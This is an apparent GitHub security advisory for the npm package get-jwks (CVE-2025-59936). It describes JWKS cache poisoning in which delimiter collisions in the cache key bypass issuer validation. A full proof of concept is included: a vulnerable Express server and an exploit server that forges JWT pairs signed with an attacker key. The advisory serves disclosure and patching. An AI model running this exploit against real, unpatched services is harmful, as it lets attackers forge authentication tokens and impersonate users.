# [C] get-jwks: poisoned JWKS cache allows post-fetch issuer validation bypass

## Summary
Severity: Critical
Advisory: GHSA-qc2q-qhf3-235m
CVE: CVE-2025-59936
CWE: CWE-116
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2025-09-26
Source: https://github.com/advisories/GHSA-qc2q-qhf3-235m
Type: github-advisory

## Affected
- npm: `get-jwks` — affected >=0 <11.0.2

## Details
### Summary
A vulnerability in `get-jwks` can lead to cache poisoning in the JWKS key-fetching mechanism. 

### Details
When the `iss` (issuer) claim is validated only after keys are retrieved from the cache, it is possible for cached keys from an unexpected issuer to be reused, resulting in a bypass of issuer validation. This design flaw enables a potential attack where a malicious actor crafts a pair of JWTs, the first one ensuring that a chosen public key is fetched and stored in the shared JWKS cache, and the second one leveraging that cached key to pass signature validation for a targeted `iss` value.

The vulnerability will work only if the `iss` validation is done after the use of `get-jwks` for keys retrieval, which usually is the common case. 

### PoC
Server code:

```js
const express = require('express')
const buildJwks = require('get-jwks')
const { createVerifier } = require('fast-jwt')

const jwks = buildJwks({ providerDiscovery: true });
const keyFetcher = async (jwt) =>
    jwks.getPublicKey({
        kid: jwt.header.kid,
        alg: jwt.header.alg,
        domain: jwt.payload.iss
    });

const jwtVerifier = createVerifier({
    key: keyFetcher,
    allowedIss: 'https://example.com',
});

const app = express();
const port = 3000;

app.use(express.json());

async function verifyToken(req, res, next) {
  const headerAuth = req.headers.authorization.split(' ')
  let token = '';
  if (headerAuth.length > 1) {
    token = headerAuth[1];
  }

  const payload = await jwtVerifier(token);

  req.decoded = payload;
  next();
}

// Endpoint to check if you are auth or not
app.get('/auth', verifyToken, (req, res) => {
  res.json(req.decoded);
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
```

Exploit server that generates the JWT pair and send the public RSA key to the victim server:

```js
const { generateKeyPairSync } = require('crypto');
const express = require('express');
const pem2jwk = require('pem2jwk');
const jwt = require('jsonwebtoken');

const app = express();
const port = 3001;
const host = `http://localhost:${port}`;
const target_iss = `https://example.com`;

const { publicKey, privateKey } = generateKeyPairSync("rsa",
    {   modulusLength: 4096,
        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
    },
);
const jwk = pem2jwk(publicKey);

app.use(express.json());

// Endpoint to create cache poisoning token
app.post('/create-token-1', (req, res) => {
  const token = jwt.sign({ ...req.body, iss: `${host}/?:${target_iss}`,  }, privateKey, { 
    algorithm: 'RS256', 
    header: {
        kid: "testkid", 
     } });
  res.send(token);
});

// Endpoint to create a token with valid iss
app.post('/create-token-2', (req, res) => {
    const token = jwt.sign({ ...req.body, iss: target_iss ,  }, privateKey, { algorithm: 'RS256', header: {
      kid: `testkid:${host}/?`, 
    } });
    res.send(token);
  });

app.get('/.well-known/jwks.json', (req, res) => {
    return res.json({
        keys: [{
            ...jwk,
            kid: 'testkid',
            alg: 'RS256',
            use: 'sig',
        }]
    });
})

app.use((req, res) => {
    return res.json({
        "issuer": host,
        "jwks_uri": host + '/.well-known/jwks.json'
    });
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
``` 

The first JWT token will create a cache entry with the chosen public key and have the following format:

`RS256:testkid:http://localhost:3001/?:https://example.com`

The second JWT has a valid `iss`, but will create the exact same cache key as the one before, leading to signature validation with the chosen public key, bypassing any future `iss` validations:

`RS256:testkid:http://localhost:3001/?:https://example.com`

### Impact
Applications relying on `get-jwks` for key retrieval, even with `iss` validation post-fetching, allows attackers to sign arbitrary payloads which will be accepted by the verifiers used. 

### Solution
Escape each component used in the cache key, so delimiter collisions are impossible.

https://github.com/nearform/get-jwks/blob/57801368adf391a32040854863d81748d8ff97ed/src/get-jwks.js#L76

## References
- https://github.com/nearform/get-jwks/security/advisories/GHSA-qc2q-qhf3-235m
- https://nvd.nist.gov/vuln/detail/CVE-2025-59936
- https://github.com/nearform/get-jwks/commit/1706a177a80a1759fe68e3339dc5a219ce03ddb9
- https://github.com/nearform/get-jwks
